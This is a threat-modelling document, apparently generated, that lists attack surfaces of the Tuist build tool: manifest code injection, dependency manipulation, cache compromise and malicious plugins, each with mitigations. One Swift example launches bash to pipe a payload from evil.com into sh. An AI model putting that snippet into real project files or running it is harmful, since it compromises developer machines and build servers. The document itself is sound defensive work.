# Attack Surface Analysis for tuist/tuist

## Attack Surface: [Manifest File Code Injection](./attack_surfaces/manifest_file_code_injection.md)

**Description:** Arbitrary Swift code execution within Tuist manifest files (e.g., `Project.swift`, `Workspace.swift`).
    *   **How Tuist Contributes:** Tuist uses Swift code for project configuration, making these files executable and thus a direct target for code injection. This is a core, defining feature of Tuist.
    *   **Example:** An attacker modifies `Project.swift` to include a script that downloads and executes a malicious payload during `tuist generate`.
        ```swift
        // Malicious code injected into Project.swift
        import Foundation
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["-c", "curl -s https://evil.com/payload | sh"]
        task.launch()
        ```
    *   **Impact:** Complete compromise of the developer's machine or build server, potentially leading to data theft, further malware installation, or lateral movement within the network.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Strict Access Control:** Limit write access to the repository and manifest files. Use branch protection rules.
        *   **Mandatory Code Reviews:** Require thorough code reviews for *all* changes to manifest files, focusing on malicious code or unusual patterns.
        *   **Sandboxing:** Run Tuist commands within a sandboxed environment (e.g., Docker, VM) to limit the impact of compromised execution.
        *   **Dependency Auditing (Manifest-Level):**  Carefully audit any *external code* used *within* the manifest files themselves.
        *   **Principle of Least Privilege:** Ensure the user account running Tuist has the minimum necessary permissions.

## Attack Surface: [Malicious Dependency Manipulation (within Manifests)](./attack_surfaces/malicious_dependency_manipulation__within_manifests_.md)

*   **Description:** Modification of project dependency declarations within Tuist manifests to point to malicious packages or vulnerable versions.
    *   **How Tuist Contributes:** Tuist's manifests define project dependencies in executable Swift code, making them a direct target for manipulation, unlike static configuration files.
    *   **Example:** An attacker changes a dependency in `Project.swift` from `TargetDependency.package(product: "LegitimatePackage")` to `TargetDependency.package(product: "MaliciousPackage")`, or changes a version pin to a known vulnerable version.
    *   **Impact:** Inclusion of malicious code in the built application, leading to potential data breaches, backdoors, or other compromises.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Dependency Pinning:** Always specify exact versions (or narrow, secure version ranges) for all dependencies.
        *   **Dependency Vulnerability Scanning:** Integrate a dependency vulnerability scanner into your CI/CD pipeline.
        *   **Private Package Repository:** Use a private package repository to control the source of dependencies.
        *   **Regular Dependency Audits:** Conduct periodic manual audits of dependencies.
        *   **Checksum Verification:** Verify checksums/hashes of downloaded dependencies (if supported).

## Attack Surface: [Compromised Tuist Cloud Cache (if used)](./attack_surfaces/compromised_tuist_cloud_cache__if_used_.md)

*   **Description:** Unauthorized access to or modification of the Tuist Cloud cache, leading to the distribution of compromised build artifacts.
    *   **How Tuist Contributes:** Tuist Cloud provides a *Tuist-specific* remote caching service, which, if compromised, becomes a distribution point for malicious builds. This is a direct attack surface of using Tuist Cloud.
    *   **Example:** An attacker gains access to Tuist Cloud credentials and replaces a cached framework with a backdoored version. Subsequent builds using the cache will include the compromised framework.
    *   **Impact:** Widespread distribution of compromised builds, potentially affecting a large number of devices and users.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Secure Credential Management:** Store Tuist Cloud credentials securely (secrets management system, environment variables). *Never* hardcode.
        *   **Strong Access Controls:** Implement strict access controls and monitoring for Tuist Cloud.
        *   **Credential Rotation:** Regularly rotate Tuist Cloud credentials.
        *   **Multi-Factor Authentication (MFA):** Enable MFA for all Tuist Cloud accounts.
        *   **Code Signing:** Digitally sign *all* build artifacts. This is *critical* for verifying integrity even if the cache is compromised.
        *   **Cache Validation (if available):** Use any cache validation mechanisms provided by Tuist Cloud.
        *   **Limited Cache Use:** Consider using the remote cache only for non-critical components.

## Attack Surface: [Malicious Tuist Plugin Installation](./attack_surfaces/malicious_tuist_plugin_installation.md)

*   **Description:** Installation of a malicious Tuist plugin that executes arbitrary code.
    *   **How Tuist Contributes:** Tuist's plugin architecture allows extending functionality, but this *Tuist-specific feature* introduces the risk of running untrusted code *within the Tuist process*.
    *   **Example:** A developer installs a plugin from a malicious source that claims to improve build performance but steals credentials.
    *   **Impact:** Complete compromise of the developer's machine or build server.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Trusted Sources Only:** Install plugins *exclusively* from trusted sources (official Tuist organization, reputable community members).
        *   **Code Review (Plugins):** Thoroughly review the source code of *any* plugin before installing it.
        *   **Sandboxing (Plugins):** If possible, run Tuist with plugins in a sandboxed environment.
        *   **Plugin Auditing:** Regularly audit installed plugins.
        *   **Plugin Verification (if available):** Use any plugin verification mechanisms provided by Tuist.
